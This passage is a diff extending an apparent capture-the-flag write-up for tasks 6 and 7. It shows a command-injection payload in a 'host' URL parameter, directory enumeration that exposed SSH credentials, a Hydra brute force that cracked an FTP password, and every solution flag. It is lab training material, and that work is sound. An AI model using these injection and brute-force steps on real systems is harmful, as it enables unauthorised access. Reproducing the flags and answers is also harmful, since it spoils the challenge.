@@ -278,6 +278,7 @@ Finished
 - Now we know that there's some sort of PHP attack that we need to accomplish
 - After much trial & error, found a path to inject commands into the `host` parameter
 ```bash
+└─# curl "http://10.0.0.1/index.php?host=127.0.0.1%7Cls%20-al"
 <!DOCTYPE html>
 <html>
 <body>
@@ -321,3 +322,68 @@ drwxr-xr-x 2   33 www-data  4096 Jun  8 17:44 admin
 
 Solved:
 `GHOSTTASK6{c0mm4nd_1nj3ct10n_pwn3d}`
+
+---
+
+### TASK-7
+
+- You get a letter when completing TASK-6 that directs you to a server with this IP `103.240.147.29`
+- Ran an NMAP scan and found HTTP/80 was open
+- Ran a dirbuster and found a `.ssh` dir on the host that contained creds to ssh to the server 
+  --UN: ghost
+  --PW: mr.ghost
+```bash
+└─# gobuster dir -u http://103.240.147.29 -w /usr/share/wordlists/dirb/big.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://103.240.147.29
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.htaccess            (Status: 403) [Size: 279]
+.htpasswd            (Status: 403) [Size: 279]
+.ssh                 (Status: 301) [Size: 315] [--> http://103.240.147.29/.ssh/]
+server-status        (Status: 403) [Size: 279]
+Progress: 20469 / 20469 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+- Logged into the VM and poked around for some time, found two interesting facts
+  --`ss -tulpn` shows that a FTP server is running
+  --`cat /etc/vsftpd.userlist` shows that there is a FTP user named `realftpghost`
+- Dug around for a "dropped" password.. no luck
+- Two more very interesting notes..
+  --`Hydra` is installed
+  --The admin left us a `rockyou` password file in `/opt`
+- Ran hydra against the ftp-server and cracked the FTP creds
+```bash
+dinghost@challenge:~$ hydra -l realftpghost -P /opt/rockyou.txt ftp://127.0.0.1
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-10 12:43:36
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://127.0.0.1:21/
+[STATUS] 265.00 tries/min, 265 tries in 00:01h, 14344133 to do in 902:09h, 16 active
+[STATUS] 267.00 tries/min, 801 tries in 00:03h, 14343597 to do in 895:22h, 16 active
+[21][ftp] host: 127.0.0.1   login: realftpghost   password: dinamo
+```
+- Once in the FTP server, poked around and found a file called `DEFUSOR.py`
+- Ran .py using sequential previous flags, which revelead a redirect to YouTube to collect flag:
+
+```bash
+ghost@challenge:~$ python3 /tmp/lock_bad.py GHOSTTASK1{fl1ck3r_s33s_4ll} GHOSTTASK2{m1rr0r_m1rr0r_s33s_4ll} GHOSTTASK3{y0u_p33l3d_th3_l4y3rs} GHOSTTASK4{s1l3nt_transm1ss10n} GHOSTTASK5{Zadar_w4s_just_the_b3g1nn1ng} GHOSTTASK6{c0mm4nd_1nj3ct10n_pwn3d}
+[*] Connecting to GHOST validation server...
+[SERVER]: [DEFUSED] BOMB NEUTRALISED. Retrieve final evidence: https://www.youtube.com/shorts/NXa-hPuIHxs
+```
+
+Solved:
+`GHOSTTASK7{NeverGonnaGiveYouUpNeverGonnaLetYouDown}`
